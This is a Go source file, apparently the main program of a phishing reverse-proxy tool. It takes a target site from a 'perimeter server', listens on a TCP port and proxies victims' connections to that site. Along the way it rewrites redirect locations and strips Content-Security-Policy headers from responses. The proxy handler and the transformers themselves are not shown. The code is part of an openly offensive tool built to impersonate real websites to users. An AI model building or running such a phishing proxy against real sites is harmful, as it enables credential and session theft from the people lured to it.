package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/pkg/errors"
)

const (
	// DefaultTimeout is the HTTP client timeout.
	DefaultTimeout = 20 * time.Second
)

var (
	servicePort     = flag.Int("port", -1, "Target service port")
	perimeterServer = flag.String("perimeter", "http://localhost:8088", "Perimeter Server URL")
)

func initFlags() {
	flag.Parse()

	if *servicePort == -1 {
		log.Fatal("--port is required")
	}
}

func start() error {
	perimeterServerUrl, err := url.Parse(*perimeterServer)
	if err != nil {
		return errors.Wrap(err, "Perimeter server url parse error")
	}

	p, err := NewPerimeter(*perimeterServerUrl, *servicePort)
	if err != nil {
		return errors.Wrap(err, "Error crating perimeter")
	}

	judasTargetUrl, err := p.GetJudasUrl()
	if err != nil {
		return errors.Wrap(err, "Error getting judas target url")
	}

	client := &http.Client{
		Timeout: DefaultTimeout,
	}

	responseTransformers := []ResponseTransformer{
		LocationRewritingResponseTransformer{},
		CSPRemovingTransformer{},
	}

	phishingProxy := &PhishingProxy{
		client:               client,
		targetURL:            judasTargetUrl,
		responseTransformers: responseTransformers,
	}

	var server net.Listener

	server, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *servicePort))
	if err != nil {
		return errors.Wrap(err, "Error listening")
	}

	log.Println(fmt.Sprintf("Listening on: http://0.0.0.0:%d", *servicePort))

	for {
		conn, err := server.Accept()

		if err != nil {
			log.Println("Error when accepting request,", err.Error())
			continue
		}

		go phishingProxy.HandleConnection(conn, p)
	}
}

func main() {
	initFlags()
	if err := start(); err != nil {
		log.Fatalf("ERROR: %v", err)
	}
}
